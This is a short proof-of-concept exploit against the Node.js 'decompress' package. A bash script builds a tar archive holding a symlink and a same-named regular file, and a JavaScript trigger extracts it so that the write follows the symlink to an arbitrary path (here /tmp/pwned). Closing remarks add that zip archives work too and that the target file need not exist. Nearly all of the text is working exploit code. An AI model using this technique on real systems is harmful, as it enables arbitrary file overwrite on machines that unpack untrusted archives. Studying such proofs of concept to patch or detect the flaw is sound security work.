PoC — building the archive

build_exploit.sh
#!/bin/bash
set -e

mkdir -p poc && cd poc

# Entry 1 — the symlink that points
# wherever we want to write
ln -s /tmp/pwned aaaaa
tar -cf exploit.tar aaaaa

# Replace it with a regular file of the
# same name and append it to the tar
rm aaaaa
echo "ARBITRARY WRITE" > aaaaa
tar -rf exploit.tar aaaaa

# Result: one tarball with TWO entries
# both named 'aaaaa'
tar -tvf exploit.tar
trigger.js
const decompress = require('decompress');

decompress('poc/exploit.tar', 'dist')
  .then(files => {
    console.log('extracted', files.length);
  })
  .catch(err => console.error(err));

Format tar accepts duplicate names natively. zip too — both work.

Target need not exist: O_CREAT on the symlink will create it.
